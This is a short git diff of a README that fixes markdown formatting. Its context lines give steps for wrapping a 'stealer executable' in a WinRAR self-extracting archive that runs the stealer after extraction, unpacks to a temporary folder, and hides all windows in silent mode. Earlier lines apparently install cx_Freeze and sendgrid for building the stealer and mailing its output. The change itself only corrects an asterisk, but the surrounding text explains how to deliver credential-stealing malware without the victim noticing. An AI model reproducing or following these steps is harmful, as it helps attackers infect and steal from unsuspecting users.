@@ -42,7 +42,7 @@ pip3 install cx_Freeze sendgrid
       - Select all the files in the *"Build"* dir, then right click it and choose *"WinRar"*.
       - Choose the *"zip"* format.
       - Under *Archiving Options* menu check the *"Create SFX archive"*.
-      - Click on the *"Advanced" tab which is in the top beside the *"General"* tab.
+      - Click on the *"Advanced"* tab which is in the top beside the *"General"* tab.
       - Click *"SFX Options.."* button.
       - Click on *"Setup"* tab, then in under the *"Run after extraction"* write the name of the stealer executable.
       - Next, click on *"Modes"*, then check the *"Unpack to temporary folder"*, and under *"silent mode"* choose *"Hide All"*.
